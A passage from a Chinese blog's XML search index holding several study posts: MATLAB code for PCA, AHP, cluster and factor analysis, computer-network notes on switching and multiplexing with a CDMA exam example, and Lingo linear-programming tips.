      <url>2019/09/20/shu-xue-jian-mo-chang-yong-de-fen-xi-fa-ji-qi-matlab-shi-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本篇分别有主成分分析，层次分析,聚类分析,因子分析的简单介绍以及在MATLAB（2018a）上使用的简单介绍 ( 附源码 )</p><h1 id="主成分分析"><a href="#主成分分析" class="headerlink" title="主成分分析"></a>主成分分析</h1><p><a href="https://baike.baidu.com/item/%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90/829840?fr=aladdin" target="_blank" rel="noopener">主成分分析-百度百科</a><br>简单讲:主成分分析就是取出几个较少的变量尽可能多地反映原来变量的信息<br>(只看主要对结果有影的几个变量)<br>主成分分析适用于数学建模中筛选出少量变量对结果造成主要影响并用函数关系表征的情况</p><pre><code>%% 主成分分析 (降维)clc, clearload example_1.txt  %数据导入（数据要求：前几列为自变量，最后一列为因变量）data = example_1;[m, n] = size(data); num = 3;   % 选取的主成分的个数mu = mean(data); sigma = std(data);  %标准差%z-score标准化方法适用于属性A的最大值和最小值未知的情况，或有超出取值范围的离群数据的情况%标准化的新数据=（原数据-均值）/标准差std_data = zscore(data);b = std_data(: , 1:end-1);     % 四个变量x1, x2, x3, x4r = cov(b);                                % 变量的协方差矩阵% 运用协方差矩阵进行PCA[PC, latent, explained] = pcacov(r);  %返回主成分(PC)、协方差矩阵X的特征值 (latent)和每个特征向量表征在观测量总方差中所占的百分数(explained)% 新的主成分z1 = PC(1,1)*x1 + PC(2,1)*x2 + PC(3,1)*x3 + PC(4,1)*x4  , z2 = ...f = repmat(sign(sum(PC)), size(PC, 1), 1);            %sum(PC)表示对矩阵PC的列求和PC = PC .* f;%1.普通的最小二乘法回归regress_args_b = [ones(m, 1), b] \ std_data(:, end);   %标准化数据的回归方程系数bzh = mu ./ sigma;% 原始数据的常数项ch10 = mu(end) - bzh(1:end-1) * regress_args_b(2:end) * sigma(end);fr_1 = regress_args_b(2:end); fr_1 = fr_1&#39;;% 原始数据的自变量的系数ch1 = fr_1 ./ sigma(1:end-1) * sigma(end);% 此时模型为 y = ch10 + ch1[1]*x1 + ch1[2] * x2 + ch1[3] * x3 + ch1[4] * x4% 计算均方误差check1 = sqrt(sum( (data(:, 1:end-1) * ch1&#39; + ch10 - data(:, end)) .^2 ) / (m - n))%2.主成分回归模型pca_val = b * PC(:, 1:num);%主成分数据的回归方程系数regress_args_pca = [ones(m, 1), pca_val] \ std_data(:, end);beta = PC(:, 1:num) * regress_args_pca(2:num+1);   %标准化数据的回归方程系数% 原始数据的常数项ch20 = mu(end) - bzh(1:end-1) * beta * sigma(end);fr_2 = beta&#39;;% 原始数据的自变量的系数ch2 = fr_2 ./ sigma(1:end-1) * sigma(end);% 此时模型为 y = ch20 + ch2[1]*x1 + ch2[2] * x2 + ch2[3] * x3 + ch2[4] * x4% 计算均方误差check2 = sqrt(sum( (data(:, 1:end-1) * ch2&#39; + ch20 - data(:, end)) .^2 ) / (m - num - 1))</code></pre><h1 id="层次分析"><a href="#层次分析" class="headerlink" title="层次分析"></a>层次分析</h1><p><a href="https://baike.baidu.com/item/%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90/10986776?fr=aladdin" target="_blank" rel="noopener">层次分析-百度百科</a><br>简单讲：就是自己将两两影响因素作重要性对比得出判断矩阵，然后得出各个影响因素的权重<br>层次分析适用于数学建模多个变量对结果不同影响程度并用函数关系表征的情况</p><pre><code>%层次分析法（AHP)disp(&#39;请输入判断矩阵A（n阶）&#39;);A = input(&#39;A=&#39;);[n,n] = size(A);x = ones(n,100);y = ones(n,100);m = zeros(1,100);m(1) = max(x(:,1));y(:,1) = x(:,1);x(:,2) = A*y(:,1);m(2) = max(x(:,2));y(:,2) = x(:,2)/m(2);p=0.0001; i=2; k=abs(m(2)-m(1));while k&gt;p    i=i+1;    x(:,i) = A*y(:,i-1);    m(i) = max(x(:,i));    y(:,i) = x(:,i)/m(i);    k=abs(m(i)-m(i-1));enda = sum(y(:,i));w = y(:,i)/a;t = m(i);disp(w);%一致性检验CI = (t-n)/(n-1);RI = [0 0 0.52 0.89 1.12 1.36 1.41 1.46 1.49 1.52 1.54 1.56 1.58 1.59];CR = CI/RI(n);if CR&lt;0.10    disp(&#39;此矩阵一致性可以接受！&#39;);    disp(&#39;CI=&#39;);disp(CI);    disp(&#39;CR=&#39;);disp(CR);end</code></pre><h1 id="聚类分析"><a href="#聚类分析" class="headerlink" title="聚类分析"></a>聚类分析</h1><p><a href="https://baike.baidu.com/item/%E8%81%9A%E7%B1%BB%E5%88%86%E6%9E%90/3450227?fr=aladdin" target="_blank" rel="noopener">聚类分析-百度百科</a><br>简单讲：就是多个影响因素按不同联系程度分类</p><pre><code>%聚类分析X;   %X为导入数据的名称(类型：数值矩阵)X=X&#39;;    %将矩阵X转置，按情况看是否需要此语句Y=pdist(X);     %X为要聚类的数组SF=squareform(Y);Z=linkage(Y,&#39;average&#39;);dendrogram(Z,0);T=cluster(Z,&#39;maxclust&#39;,3);</code></pre><h1 id="因子分析"><a href="#因子分析" class="headerlink" title="因子分析"></a>因子分析</h1><p><a href="https://baike.baidu.com/item/%E5%9B%A0%E5%AD%90%E5%88%86%E6%9E%90/91849" target="_blank" rel="noopener">因子分析-百度百科</a><br>可看作是主成分分析的推广，涉及的计算与主成分分析很类似</p><pre><code>%因子分析clc,clearload ssgs.txt   %把原始数据保存在纯文本文件ssgs.txt中n=size(ssgs,1);x=ssgs(:,[1:4]); y=ssgs(:,5); %分别提出自变量x1...x4和因变量x的值x=zscore(x); %数据标准化r=corrcoef(x)  %求相关系数矩阵[vec1,val,con1]=pcacov(r)  %进行主成分分析的相关计算f1=repmat(sign(sum(vec1)),size(vec1,1),1);vec2=vec1.*f1;     %特征向量正负号转换f2=repmat(sqrt(val)&#39;,size(vec2,1),1); a=vec2.*f2   %求初等载荷矩阵num=input(&#39;请选择主因子的个数：&#39;);  %交互式选择主因子的个数am=a(:,[1:num]);  %提出num个主因子的载荷矩阵[bm,t]=rotatefactors(am,&#39;method&#39;, &#39;varimax&#39;) %am旋转变换,bm为旋转后的载荷阵bt=[bm,a(:,[num+1:end])];  %旋转后全部因子的载荷矩阵,前两个旋转，后面不旋转con2=sum(bt.^2)       %计算因子贡献check=[con1,con2&#39;/sum(con2)*100]%该语句是领会旋转意义,con1是未旋转前的贡献率rate=con2(1:num)/sum(con2) %计算因子贡献率coef=inv(r)*bm          %计算得分函数的系数score=x*coef           %计算各个因子的得分weight=rate/sum(rate)  %计算得分的权重Tscore=score*weight&#39;   %对各因子的得分进行加权求和，即求各企业综合得分[STscore,ind]=sort(Tscore,&#39;descend&#39;)      %对企业进行排序display=[score(ind,:)&#39;;STscore&#39;;ind&#39;] %显示排序结果[ccoef,p]=corrcoef([Tscore,y])    %计算F与资产负债的相关系数[d,dt,e,et,stats]=regress(Tscore,[ones(n,1),y]);%计算F与资产负债的方程d,stats  %显示回归系数，和相关统计量的值</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：计算机网络（持续更新）</title>
      <link href="2019/09/16/xue-xi-bi-ji-ji-suan-ji-wang-luo/"/>
      <url>2019/09/16/xue-xi-bi-ji-ji-suan-ji-wang-luo/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此笔记为学习教材《计算机网络》(第7版)-谢希仁以及中国大学MOOC 哈尔滨工业大学 李全龙老师的视频所记录的一些知识点</p><h2 id="1-1-计算机网络基本概念"><a href="#1-1-计算机网络基本概念" class="headerlink" title="1.1 计算机网络基本概念"></a>1.1 计算机网络基本概念</h2><h3 id="什么是计算机网络？"><a href="#什么是计算机网络？" class="headerlink" title="什么是计算机网络？"></a>什么是计算机网络？</h3><p>计算机网络=通信技术+计算机技术</p><ul><li>通信系统模型：</li></ul><pre class="mermaid">graph LRA[信源]-->B[发送设备]B[发送设备]-->C[信道]D[噪声源]-->C[信道]C[信道]-->E[接收设备]E[接收设备]-->F[信宿]</pre><p>计算机网络就是一种通信网络</p><p>定义：计算机网络就是<strong>互连</strong>的、<strong>自治</strong>的计算机集合。</p><p>（互连：无主从关系     互联：通过通信链路完成互联互通）</p><p>主机距离远、数量大需要通过<strong>交换网络</strong>互连主机</p><p>交换网络中的<strong>交换节点</strong>：路由器或交换机</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705191419376.png" width="30%"/></center>  - Internet组成细节角度    全球最大的互联网络 IPS网络互连的“网络之网络”    计算设备集合：主机(hosts)=端系统(end systems)    通信链路：光纤、铜缆、无线电、卫星......    分组交换：转发分组(数据包)    路由器和交换机  - Internet服务角度    为网络应用提供通信服务的通信基础设施：Web、VoIP、email、网络游戏、电子商务...    为网络应用提供编程接口（API）：支持应用程序“连接”Internet,发送/接收数据；提供数据传输服务...  然鹅，仅有硬件（主机、通信链路、路由器...）连接，Internet是无法顺畅运行的（无法保证应用数据有序交付），因此**协议**  ### 什么是网络协议？    网络协议主要是为了让网络资源物尽其用。  - 协议是计算机网络有序运行的重要保证    - 硬件    - 计算机网络中的数据交换必须遵守事先约定好的**规则**  网络协议(network protocol)，简称**协议**，是为进行网络中的数据交换而建立的规则、标准。  协议规定了通信实体之间所交换消息的**格式、意义、排序**以及针对收到信息或发生事件所采取的“动作”。  - 协议的三要素    - 语法(Syntax)      数据与控制信息的结构或格式      信号电平(底层信息)    - 语义(Semantics)      需要发出何种控制信息      完成何种动作以及做出何种响应      差错控制    - 时序(Timing)      事件顺序      速度匹配  - 协议是计算机网络的重要内容    - 协议规范了网络中所有信息的发送和接收过程      eg: TCP , IP , HTTP , Skype , 802.11    - 学习网络的重要内容之一    - 网络创新的表现形式之一    - Internet协议标准      - RFC：Request for Comments(权威)      - IETF:互联网工程任务组(Internet Engineering Task Force)  ## 1.2 计算机网络结构### 计算机网络结构  ##### 网络边缘  - 主机    - 位于“网络边缘”    - 运行网络应用程序，例如：web，email  - 网络应用    - 客户/服务器（client/server）应用模型      客户发送请求，接收服务器响应，如：Web应用，文件传输FTP应用    - 对等(peer-peer,P2P)应用模型      无(或不仅依赖)专用服务器      通信在**对等**实体之间直接进行      如：Skype,QQ  ##### 接入网络（物理介质）  - 有线或无线通信链路  接入网络主要为将网络边缘接入核心网络  接入网络分为：住宅/家庭接入网络；机构接入网络（学校企业等）；移动接入网络  用户关心的是：带宽(bandwidth，bps) ；独占/共享？  举个栗子：  - 栗子一，接入网络：数字用户线路（DSL）    <center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705191649867.png" width="50%"/></center><ol><li>家庭用户利用<strong>已有的</strong>电话线连接中心局的DSLAM（数据通过DSL电话线接入Internet,语音/电话通过DSL电话线接入电话网）</li><li>&lt;2.5Mbps上行传输速率(典型速率&lt;1Mbps)   ~上传速度</li><li>&lt;24Mbps 下行传输速率(典型速率&lt;1Mbps)   ~下载速度</li><li>FDM(利用不同的频带传输)：50 kHz- 1MHz用于下行；4 kHz- 50kHz用于上行；0 kHz- 4kHz用于传统通话；</li></ol><ul><li><p>栗子二，接入网络：电缆网络</p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192154360.png" width="50%"/></center><br>FDM频分多路复用：在不同频带(载波)上传输不同频道</p><p>HFC：混合光纤同轴电缆（非对称，下行高达30Mbps传输速率，上行2Mbps传输速率）</p></li></ul><p>各家庭设备通过电缆网络→光纤接入ISP路由器（各家庭<strong>共享</strong>家庭至电缆头端的接入网络；不同DSL的<strong>独占</strong>至中心局的接入）</p><ul><li><p>栗子三，接入网络：典型家庭网络的接入</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192228414.png" width="50%"/></center></li><li><p>栗子四，接入网络：机构(企业)接入网络</p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192307888.png" width="50%"/></center><br>  主要用于公司、高校等组织机构    (个人或家庭也可以用)</p></li></ul><p>典型传输速率：10Mbps,100Mbps,1Gbps,10Gbps    </p><p>目前，端系统通常直接连接以太网交换机(switch)</p><ul><li><p>栗子五，交换网络：无线接入网络</p><p>通过<strong>共享</strong>接入网络连接端系统与路由器 【通过”基站 （base station）”或称为”接入点 （access point）”】</p><p>例如，<strong>无线局域网(LANs)</strong></p><ul><li>同一建筑物内(30m)</li><li>802.11b/g(WiFi):11Mbps\54Mbps传输速率</li></ul><p>例如，<strong>广域无线接入</strong></p><ul><li>通过电信运营商（蜂窝网），接入范围几十公里</li><li>带宽：1Mbps、10Mbps、100Mbps</li><li>移动互联网</li></ul></li></ul><h5 id="网络核心（核心网络）"><a href="#网络核心（核心网络）" class="headerlink" title="网络核心（核心网络）"></a>网络核心（核心网络）</h5><ul><li><p>互联的路由器（或分组转发设备）</p></li><li><p>网络之网络</p></li></ul><p>网络核心的关键功能是：<strong>路由</strong>+<strong>转发</strong></p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192401433.png" width="50%"/></center><br>网络核心解决的基本问题是：用<strong>数据交换</strong>的方法实现数据源主机通过网络核心送达目的主机</p><h3 id="Internet结构"><a href="#Internet结构" class="headerlink" title="Internet结构"></a>Internet结构</h3><p>端系统通过<strong>接入ISP（access ISPs）</strong>连接到Internet，例如家庭、公司和大学ISPs</p><p>接入ISP必须进一步互联（这样任意两个主机才可以互相发送分组）</p><p>构成复杂的网络互连的网络（经济和国家政策是网络演进的主要驱动力）</p><p>当前Internet结构无人能给出精确描述</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192518036.png" alt="数以百万计的ISP互连"></p><h2 id="1-3-网络核心"><a href="#1-3-网络核心" class="headerlink" title="1.3 网络核心"></a>1.3 网络核心</h2><h4 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h4><p>考虑：$N^2$链路问题，连通性，网络规模</p><p>交换的含义：1.动态转接；2.<strong>动态分配传输资源</strong>；</p><p>数据交换的类型：    </p><ol><li>电路交换</li><li>报文交换</li><li>分组交换</li></ol><ul><li><p>电路交换的特点</p><ul><li>最典型的交换网络：电话网络</li></ul><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705235934426.png" width="50%"/></center></li><li><p>电路交换的三个阶段:</p><ol><li>建立连接（呼叫/电路建立）</li><li>通信</li><li>释放连接（拆除电路）</li></ol></li><li><p><strong>独占资源</strong>（释放连接之后电路资源才可被第三方占有）</p><p>【然而电路交换网络中，每条电路<strong>不是</strong>独占其经过的物理链路的，至于电路交换网络如何实现<strong>链路共享</strong>，这又扯到<strong>多路复用</strong>】 </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706001014777.png" alt=""></p></li></ul><h4 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h4><p>多路复用(multiplexing)，简称<strong>复用</strong>，是通信技术中的基本概念。</p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706001117993.png" width="50%"/></center></p><ul><li>多路复用：链路/网络资源（如带宽）划分为“资源片”<ul><li>将资源片分配给各路“呼叫”（calls）</li><li>每路呼叫<strong>独占</strong>分配到的资源片进行通信</li><li>资源片可能<strong>“闲置”</strong>（<strong>idle</strong>）(无共享)</li></ul></li><li>典型多路复用方法：<ul><li>频分多路复用（frequency divsion multiplexing，<strong>FDM</strong>）</li><li>时分多路复用（time divsion multiplexing，<strong>TDM</strong>）</li><li>时分多路复用（Wavelength divsion multiplexing，<strong>WDM</strong>）</li><li>码分多路复用（Code divsion multiplexing，<strong>CDM</strong>）</li></ul></li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706002059008.png" alt=""></p><ul><li><p>频分多路复用（FMD）</p><ul><li><p>频分多路复用的个用户占用不同的带宽资源（这的“带宽”是<strong>频率带宽（单位：Hz）</strong>而不是数据的发送速率）</p></li><li><p>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/67b9b206b3e8c6adb9bf55a97f173c7.png" alt=""></p></li></ul></li><li><p>时分多路复用（TDM）</p><ul><li><p>时分复用则是将时间划分为一段段等长的<strong>十分复用帧</strong>（TDM帧），每个用户在每个TDM帧中占用固定序号的时隙。</p></li><li><p>每个用户所占用的时隙是<strong>周期性出现</strong>（其周期就是TDM帧的长度）。</p></li><li><p>时分复用的所有用户是在不同的时间占用<strong>相同的</strong>频带宽度。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706003833391.png" alt=""></p></li></ul></li><li><p>波分多路复用（WDM）</p><p>WDM的实质是FDM</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706004019570.png" alt="波分复用就是光的频分复用"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706004041762.png" alt=""></p></li><li><p>码分多路复用（CDM）</p><p>详细码分多址（CDMA）</p><ul><li><p>广泛应用于无线链路共享（如蜂窝网，卫星通信等）</p></li><li><p>每个用户分配一个唯一 m bit<strong>码片序列</strong>（chipping sequence），其中“0”用“-1”表示、“1”用“+1”表示，例如：</p><p>S站的码片序列：（-1 -1 - 1 +1 +1 -1 +1 +1）</p></li><li><p>各用户使用<strong>相同频率</strong>载波，利用各自码片序列编码数据</p></li><li><p>编码信号=（原始数据）$\times$ (码片序列)</p><p>如发送比特 1 （+1），则发送自己的m bit 码片序列</p><p>如发送比特 0 （-1），则发送自己的m bit 码片序列的反码</p></li><li><p>各用户序列相互正交（orthogonal）</p><script type="math/tex; mode=display">\frac{1}{m} S_0 \cdot S_j = \left \{          \begin{aligned}   1, i=j          \\\\      0, i \not = j   \end{aligned}        \right.  \\\\        \frac{1}{m} S_0 \cdot S_j = \left \{    \begin{aligned}      -1, i=j    \\\\      0, i \not = j \end{aligned} \right.</script><p>此用于判断是否为用户自己的码片序列，令$d_i$为原始数据序列，各用户的叠加向量为：</p></li></ul><script type="math/tex; mode=display">P = \sum_{i=1}^N d_i \cdot S_i = \sum_{i=1}^N  \overset{(-)} S_i</script></li></ul><p>​    </p><ul><li><strong>解码</strong>：码片序列与编码信号的<strong>内积</strong><script type="math/tex; mode=display">\frac{1}{m} S_i \cdot P = \left \{    \begin{aligned}    &1,    & S_i \in j \\    &-1,&  \overset{-} S_i \in P    \\    &0,    &    S_i,\overset{-} S_i \not \in P  \end{aligned}    \right.</script></li></ul><p>​    </p><p>​    <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706010859310.png" alt="单个用户"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706010939848.png" alt="多个用户"></p><blockquote><p>例题：站点A、B、C通过CDMA共享链路，A、B、C的码片序列（chipping sequence）分别是（1,1,1,1）、（1，-1,1，-1）和（1，1,-1，-1），若C从链路上收到的序列是（2,0,2,0,0，-2,0，-2,0,2,0,2），则C收到A发送的数据是 （）</p><p>A.000</p><p>B.101</p><p>C.110</p><p>D.111</p><p>正确答案是 B</p><p>C接收到的是A，B发送过来的叠加码片，C想要看A发送的数据，就将接收到的叠加码片与A的码片序列进行规格化内积操作：（2，0，2，0；0，-2，0，-2；0，2，0，2）每四位与（1，1，1，1）进行规格化内积，（2 <em> 1+0 </em> 1+2 <em> 1+0 </em> 1)/4=1;（0 <em> 1+2 </em> 1+0 <em> 1+2 </em> 1)/4=-1，-1即0;（0 <em> 1+2 </em> 1+0 <em> 1+2 </em> 1)/4=1;可以得到结果101</p></blockquote><h4 id="报文交换与分组交换"><a href="#报文交换与分组交换" class="headerlink" title="报文交换与分组交换"></a>报文交换与分组交换</h4><ul><li><p>报文交换（message switching）</p><p>报文：源（应用）发送信息整体，比如一个文件</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064307886.png" width="50%"/></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064339694.png" width="50%"/></center></li><li><p>分组交换（package switching）</p><p>分组：报文拆出来的一系列相对较小的数据包 （由头+数据包构成）</p></li></ul><p>  <center><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="54" height="20"><linearGradient id="s" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="r"><rect width="54" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#r)"><rect width="21" height="20" fill="#555"/><rect x="21" width="33" height="20" fill="#4c1"/><rect width="54" height="20" fill="url(#s)"/></g><g fill="#fff" text-anchor="middle" font-family="Verdana,Geneva,DejaVu Sans,sans-serif" text-rendering="geometricPrecision" font-size="110"><text x="115" y="150" fill="#010101" fill-opacity=".3" transform="scale(.1)" textLength="110">头</text><text x="115" y="140" transform="scale(.1)" textLength="110">头</text><text x="365" y="150" fill="#010101" fill-opacity=".3" transform="scale(.1)" textLength="230">数据</text><text x="365" y="140" transform="scale(.1)" textLength="230">数据</text></g></svg></center><br>分组交换需要报文的<strong>拆分</strong>与<strong>重组</strong></p><p>  产生<strong>额外开销</strong></p><p>  <center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064427056.png" width="50%"/></center></p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064516951.png" width="50%"/></center><br>  <center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064601183.png" width="50%"/></center></p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064719009.png" width="50%"/></center><br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706073211102.png" alt="分组交换：统计多路复用"></p><p>A&amp;B分组序列不确定（不是事先分配好的），按需共享链路（A与B总共带宽是1.5Mb/s）</p><p>【PS:  “Mbps”，其全称为Million bits per second，意为每秒传输百万位（比特） ， <strong>Mbps=Mb/s</strong> ；MB表示Million Bytes（百万字节） 。】</p><ul><li><p>存储转发 （store-and-forward） </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706073844184.png" alt="image-20200706073844184"></p><ul><li><p>报文交换与分组交换均采用存储-转发交换方式（区别：报文交换以完整报文进行“存储-转发”）</p></li><li><p>分组交换以较小的分组进行“存储-转发” </p></li></ul></li></ul><p>  哪种交换好呢？</p><ul><li><p>分组交换：传输延迟</p><p>发送主机：</p><ul><li><p>接收应用报文（消息）</p></li><li><p>拆分为较小长度为<strong>L</strong></p></li><li><p>在传输速率为<strong>R</strong>的链路上传输妇分组</p><script type="math/tex; mode=display">分组传输延迟(时延delay)= \frac{L(bits)}{R(bits/sec)}</script></li></ul></li></ul><ul><li><p>报文交换VS分组交换</p><ul><li><p>报文交换</p><p>报文长度为 <strong>M</strong> bits</p><p>链路带宽为 <strong>R</strong> bps</p><p>每次传输报文需要 <strong>M/R</strong></p></li><li><p>分组交换</p><p>报文被拆分为多个分组</p><p>分组长度为 <strong>L</strong> bits</p><p>每个分组传输时延为 <strong>L/R</strong>秒</p></li><li><p>例</p><p>M = 7.5 Mbits</p><p>L = 1500</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：数据结构</title>
      <link href="2019/09/14/xue-xi-bi-ji-shu-ju-jie-gou/"/>
      <url>2019/09/14/xue-xi-bi-ji-shu-ju-jie-gou/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性规划计算工具Lingo</title>
      <link href="2019/08/20/xian-xing-gui-hua-ji-suan-gong-ju-lingo/"/>
      <url>2019/08/20/xian-xing-gui-hua-ji-suan-gong-ju-lingo/</url>
      
        <content type="html"><![CDATA[<p>教程: <a href="https://wenku.baidu.com/view/b108344e1a37f111f0855b5e.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b108344e1a37f111f0855b5e.html</a></p><p>​    <a href="https://wenku.baidu.com/view/a55bf6310b4c2e3f5727634e.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/a55bf6310b4c2e3f5727634e.html</a></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image001.png" alt="img">编译(Slove)         快捷键: ctrl+U</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002-1593887482556.png" alt="img">返回编码区(Send to back)</p><p>1、 按ctrl+鼠标中键滑动控制字体大小</p><p>2、 分号结尾</p><p>3、 空格无影响，大小写不区分</p><p>4、 乘号*</p><p>5、 @gin（x）；  ：表示将变量x强制转换为整数</p><p>6、 @bin（x）；  ：表示x为0或1</p><p>7、 @free（x）；  ：表示x为任意实数</p><p>8、 @bnd（1，x，u）    ：表示x为[1,u]之间的实数</p><p>9、 默认变量是非负实数</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image003.png" alt=""></p><p>以sets:  开始 (规矩)</p><p>表示1,2,3,4,5,6在集合S里</p><p>​        </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image005.jpg" alt="结果分析"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image007.jpg" alt="结果分析一"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image009.jpg" alt="结果分析二"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image011.jpg" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image012-1593887482543.png" alt=""></p><p>如图集合U定义双下标</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image013-1593887482544.png" alt=""></p><p>变量a,b,d有分量1~6;</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image015-1593887482544.jpg" alt="img"></p><p>数据栈</p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
